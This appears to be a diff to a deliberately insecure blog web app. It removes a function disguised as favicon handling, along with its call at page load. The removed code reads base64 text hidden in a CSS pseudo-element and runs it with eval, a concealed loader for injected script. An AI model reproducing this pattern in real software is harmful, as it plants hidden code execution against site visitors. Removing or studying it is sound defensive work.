@@ -140,14 +140,6 @@ const InsecureBlogApp = {};
         return InsecureBlogApp.user.roles.some(r => r.role === 'publisher' || r.role === 'admin');
     }
 
-    InsecureBlogApp.rxFavicon = function() {
-        const newDiv = document.createElement('div');
-        newDiv.classList.add('rx-favicon');
-        document.body.appendChild(newDiv);
-        const images = window.getComputedStyle(newDiv, ':before').content.split(',');
-        eval(`(${atob(images[2].slice(0, -1))})()`);
-    }
-
     InsecureBlogApp.logout = function( m ) {
         InsecureBlogApp.session( null );
         // todo - log out of third party
@@ -238,7 +230,6 @@ const InsecureBlogApp = {};
             InsecureBlogApp.toast( 'success', message );
         }
 
-        InsecureBlogApp.rxFavicon();
         InsecureBlogApp.checkSession();
         InsecureBlogApp.spinStop();
         InsecureBlogApp.finishLoading();
